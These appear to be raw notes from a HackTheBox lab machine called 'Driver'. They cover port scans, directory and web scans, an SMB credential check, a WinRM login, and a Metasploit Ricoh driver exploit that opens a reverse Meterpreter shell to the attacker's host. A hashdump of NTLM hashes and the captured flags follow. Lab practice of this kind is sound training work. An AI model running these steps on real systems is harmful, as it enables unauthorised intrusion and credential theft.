Driver IP:10.10.11.106


rustscan:
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack
135/tcp  open  msrpc        syn-ack
445/tcp  open  microsoft-ds syn-ack
5985/tcp open  wsman        syn-ack



nmap:

PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
445/tcp  open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44926/tcp): CLEAN (Timeout)
|   Check 2 (port 18115/tcp): CLEAN (Timeout)
|   Check 3 (port 26928/udp): CLEAN (Timeout)
|   Check 4 (port 46069/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-20T21:31:37
|_  start_date: 2023-02-20T21:26:16

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:32
Completed NSE at 09:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:32
Completed NSE at 09:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:32
Completed NSE at 09:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.73 seconds




┌──(kali㉿kali)-[~/Practice/HackTheBox/Driver]
└─$ crackmapexec smb 10.10.11.106 -u tony -p liltony  
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Driver]
└─$ evil-winrm -i 10.10.11.106 -u tony -p liltony

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> cd ..
*Evil-WinRM* PS C:\Users\tony> cd Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> ls


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/20/2023   1:26 PM             34 user.txt


*Evil-WinRM* PS C:\Users\tony\Desktop> cat user.txt
b26ef584bbcb39356d5c3a8622d99917
*Evil-WinRM* PS C:\Users\tony\Desktop> 


PrivESC:

msf6 exploit(windows/local/ricoh_driver_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ricoh_driver_privesc) > run

[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer GBKIOFgZ...
[*] Sending stage (200774 bytes) to 10.10.11.106
[+] Deleted C:\Users\tony\AppData\Local\Temp\jWOXXI.bat
[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
[*] Meterpreter session 2 opened (10.10.14.9:4444 -> 10.10.11.106:49421) at 2023-02-20 09:57:49 -0500
[*] Deleting printer GBKIOFgZ

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 


meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2021-06-11 06:57:47 -0400  desktop.ini
100444/r--r--r--  34    fil   2023-02-20 16:26:46 -0500  root.txt

meterpreter > cat root.txt
2359a3abfcaa8b4acea9615a02f8a6cc




meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::


 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ricoh_driver_privesc                     Yes                      The target appears to be vulnerable. Ricoh driver directory has full permissions
 11  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.


                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Practice/HackTheBox/Driver]
└─$ gobuster dir  -u http://10.10.11.106  -w /usr/share/wordlists/dirb/common.txt -t 64  -x txt,php,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.11.106
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2023/02/20 09:29:41 Starting gobuster
===============================================================
/images (Status: 301)
/Images (Status: 301)
/index.php (Status: 401)
/index.php (Status: 401)
/Index.php (Status: 401)
===============================================================
2023/02/20 09:30:08 Finished
===============================================================





┌──(kali㉿kali)-[~/Practice/HackTheBox/Driver]
└─$ nikto -h http://10.10.11.106        
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.106
+ Target Hostname:    10.10.11.106
+ Target Port:        80
+ Start Time:         2023-02-20 09:30:32 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: PHP/7.3.25
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm 'MFP Firmware Update Center. Please enter password for admin'
+ Default account found for 'MFP Firmware Update Center. Please enter password for admin' at / (ID 'admin', PW 'admin'). Generic account discovered..
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 



Website on port 80 leads to a login, fortunately nikto got user and passwd: admin / admin

